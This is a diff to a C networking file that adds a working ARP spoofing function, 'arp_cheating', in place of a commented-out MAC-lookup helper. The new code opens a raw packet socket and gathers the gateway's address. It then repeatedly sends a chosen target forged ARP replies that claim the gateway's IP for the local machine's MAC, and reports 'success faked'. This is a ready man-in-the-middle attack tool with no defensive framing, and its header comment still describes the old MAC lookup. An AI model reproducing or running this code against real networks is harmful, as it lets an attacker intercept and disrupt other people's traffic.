@@ -293,79 +293,153 @@ int arp_cheat(const char *iifname, const char *iattack_ip,
  * @brief get_net_mac 
  *
  * @param ip     [in]  target ip address
- * @param mac[6] [out] target mac address
  *
  * @return 0, if uscc; -1, if failed
  */
-/*
-int get_net_mac(const char *dstip, unsigned char mac[6])
+int arp_cheating(char *dstip)
 {
-    int fd; 
-    struct ifreq req;
-    struct in_addr addr;
-    struct sockaddr_ll addr_ll;
-    char ip[20] = {0};
-    unsigned char src_ip[4] = {0};
-    unsigned char dst_ip[4] = {0};
-    unsigned char src_mac[4] = {0};
-    char ifname[64] = {0};
-    char *ifname_save = (char *)ifname;
-    char buf[1024] = {0};
+    int fd, ret, len;
+    struct sockaddr addr;
+    struct frame_arp snd_buf, recv_buf, reply_snd_buf;
+    char ifname[10] = {0};
+    unsigned char src_mac[6];
+    unsigned char src_ip[6];
+    unsigned char dst_ip[6];
+    unsigned char gw_ip[6];
+    char src_ip_buf[20] = {0};
+    char gw_ip_buf[20] = {0};
+    char ip_buf[20] = {0};
+    struct timeval tv = {0};
+    fd_set set;
+    int ar_op = 0;
 
-    if (ip == NULL) return -1;
-    get_ifname(ifname);
-    ifname_save = strtok(ifname, " ");
-    if (ifname_save == NULL) return -1;
+    if (dstip == NULL) return -1;
 
-    if (!inet_aton(dstip, &addr)) {
-        fprintf(stderr, "invalid ip address %s\n", ip);
+    /**
+     * local info
+     */
+    get_gateway(gw_ip_buf, ifname);
+    get_ip_by_ifname(ifname, src_ip_buf);
+    get_mac_addr(ifname, src_mac);
+    ip2arr(gw_ip_buf, gw_ip);
+    ip2arr(src_ip_buf, src_ip);
+    ip2arr(dstip, dst_ip);
+    printf("ifname: %s\n", ifname);
+    print_ipv4(src_ip, "src_ip");
+    print_ipv4(dst_ip, "dst_ip");
+    print_ipv4(gw_ip, "gw_ip");
+
+    /**
+     * init addr
+     */
+    memset(&addr, 0, sizeof(addr));
+    addr.sa_family = PF_PACKET;
+    strcpy(addr.sa_data, ifname);
+
+    /**
+     * create socket
+     */
+    if ((fd = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_ARP))) < 0) {
+        perror("socket()");
         exit(1);
     }
 
-    if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
-        perror("WARNING socket()");
+    /**
+     * bind socket
+     */
+    if (bind(fd, &addr, sizeof(addr)) < 0) {
+        perror("bind()");
+        exit(1);
     }
 
-    addr_ll.sll_family = AF_PACKET;
-    memset(&req, 0, sizeof(req));
-    strcpy(req.ifr_name, ifname_save);
-    xioctl(fd, SIOCGIFINDEX, (char *)&req, "ioctl() SIOCGIFINDEX");
-    addr_ll.sll_ifindex = req.ifr_ifindex;
-    addr_ll.sll_protocol = htons(ETH_P_ARP);
-    
-    get_ip_by_ifname(ifname_save, ip);
-    ip2arr(ip, src_ip);
-    get_mac_addr(ifname_save, src_mac);
-    ip2arr(dstip, dst_ip);
-	
-    arp_request_send(fd, (struct sockaddr *)&addr_ll, dst_ip, src_ip, src_mac);
-    unsigned char from[4];
+    /**
+     * init arp request packet
+     */
     while (1) {
-        struct sockaddr_ll he;
-        socklen_t len = sizeof(he);
-        struct frame_hdr *fh;
-        struct arp_hdr *ah;
-        char *p = NULL;
-        int ret = 0;
-        
-        ret = recvfrom(fd, buf, sizeof(buf), 0, 
-                (struct sockaddr *)&he, &len);
-        if (ret < 0) continue;
-        fh = (struct frame_hdr *)buf;
-        ah = (struct arp_hdr*)(fh + 1);
-        p = (char *)(ah + 1);
-        memcpy(mac, p, 6);
-        p += 6;
-        memcpy(from, p, 4);
-        if (from[0] == dst_ip[0] && from[1] == dst_ip[1] &&
-                from[2] == dst_ip[2] && from[3] == dst_ip[3])
-		break;
-	}
+        len = sizeof(struct sockaddr);
+        ret = recvfrom(fd, &recv_buf, sizeof(recv_buf), 0, &addr, (socklen_t *)&len);
 
-    close(fd);
+        if (ntohs(recv_buf.ah.ar_op) != ARPOP_REQUEST)
+            continue;
 
+        break;
+    }
+    memcpy(&snd_buf, &recv_buf, sizeof(recv_buf));
+    memcpy(snd_buf.fh.src_mac, src_mac, 6);
+    memcpy(snd_buf.src_mac, src_mac, 6);
+    memset(snd_buf.fh.dst_mac, -1, 6);
+    memset(snd_buf.dst_mac, 0, 6);
+    memcpy(snd_buf.dst_ip, dst_ip, 4);
+    memcpy(snd_buf.src_ip, src_ip, 4);
+
+    memcpy(&reply_snd_buf, &recv_buf, sizeof(recv_buf));
+    memcpy(reply_snd_buf.fh.src_mac, src_mac, 6);
+    memcpy(reply_snd_buf.src_mac, src_mac, 6);
+    memcpy(reply_snd_buf.dst_ip, dst_ip, 4);
+    memcpy(reply_snd_buf.src_ip, gw_ip, 4);
+
+    sendto(fd, &snd_buf, sizeof(snd_buf), 0, &addr, len);
+    printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", 
+            dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);
+
+    //gettimeofday(&s, NULL);
+    //printf("time: %d, s.tc_sec: %d, s.tv_usec: %d\n", tuse, (int)s.tv_sec, (int)s.tv_usec);
+    FD_ZERO(&set);
+    FD_SET(fd, &set);
+    while (1) {
+        tv.tv_sec = 0;
+        tv.tv_usec = 1000 * 100;
+        FD_ZERO(&set);
+        FD_SET(fd, &set);
+
+        //sendto(fd, &snd_buf, sizeof(snd_buf), 0, &addr, len);
+        select(fd + 1, &set, NULL, NULL, &tv);
+        if (FD_ISSET(fd, &set))
+        {
+            recvfrom(fd, &recv_buf, sizeof(recv_buf), 0, NULL, NULL);
+            if (ntohs(recv_buf.fh.proto_type) != 0x0806) continue;
+            ar_op = ntohs(recv_buf.ah.ar_op);
+
+            // ------------------------------------arp frame info-------------------------------------------------------
+            if(ar_op == 1) printf("arp request\t");
+            if(ar_op == 2) printf("arp reply \t");
+            inet_ntop(AF_INET, &recv_buf.src_ip, ip_buf, sizeof(ip_buf));
+            printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", recv_buf.src_mac[0],recv_buf.src_mac[1],recv_buf.src_mac[2],
+                    recv_buf.src_mac[3],recv_buf.src_mac[4],recv_buf.src_mac[5], ip_buf);
+            printf("\t->\t");
+            memset(ip_buf, 0, sizeof(ip_buf));
+            inet_ntop(AF_INET, &recv_buf.dst_ip, ip_buf, sizeof(ip_buf));
+            printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", recv_buf.dst_mac[0], recv_buf.dst_mac[1], 
+                    recv_buf.dst_mac[2], recv_buf.dst_mac[3], recv_buf.dst_mac[4], 
+                    recv_buf.dst_mac[5], ip_buf);
+            printf("\n");
+
+            if (memcmp(recv_buf.src_ip, dst_ip, 4)) continue;
+
+            if (ar_op == ARPOP_REQUEST)
+                sendto(fd, &snd_buf, sizeof(snd_buf), 0, &addr, len);
+            else if (ar_op == ARPOP_REPLY) {
+                sleep(1);
+                memcpy(reply_snd_buf.fh.dst_mac, recv_buf.src_mac, 6);
+                memcpy(reply_snd_buf.dst_mac, recv_buf.src_mac, 6);
+                sendto(fd, &reply_snd_buf, sizeof(reply_snd_buf), 0, &addr, len);
+                printf("\033[0;35msuccess faked %d.%d.%d.%d\n\033[0m", 
+                        (recv_buf.src_ip)[0], (recv_buf.src_ip)[1],
+                        (recv_buf.src_ip)[2], (recv_buf.src_ip)[3]);
+            }
+        }
+    }
+    
+    //gettimeofday(&e, NULL);
+    //printf("time: %d, e.tc_sec: %d, e.tv_usec: %d\n", tuse, (int)e.tv_sec, (int)e.tv_usec);
+    //tuse = 1000000 * (e.tv_sec - s.tv_sec) + e.tv_usec - s.tv_usec;
+    //print_ipv4(recv_buf.src_ip, NULL);
+    //print_mac(mac, NULL);
+    //printf("time: %d, e.tv_usec: %d\n", tuse, (int)e.tv_usec);
+    //printf("%d:%d:%d:%d's mac address: %02x:%02x:%02x:%02x:%02x:%02x, used %d.%03ds\n", 
+    //        dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3], mac[0], mac[1], mac[2], mac[3], 
+    //        mac[4], mac[5], (int)tuse / 1000000, (int)tuse % 1000000);
     return 0;
 }
-*/
 
 
